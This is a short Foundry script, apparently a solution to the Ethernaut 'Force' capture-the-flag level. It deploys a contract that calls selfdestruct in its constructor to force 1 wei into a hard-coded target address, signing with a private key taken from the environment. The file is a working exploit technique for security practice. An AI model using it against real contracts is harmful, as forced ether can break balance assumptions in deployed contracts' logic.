// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";

contract Destructed {
    constructor(address payable _forceAddress) payable {
        selfdestruct(_forceAddress);
    }
}

contract ForceSolution is Script {

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new Destructed{value: 1 wei}(payable(0xF6D53aafc4E89eAD9f3111585fA4998Fa09F4710));
        vm.stopBroadcast();
    }
}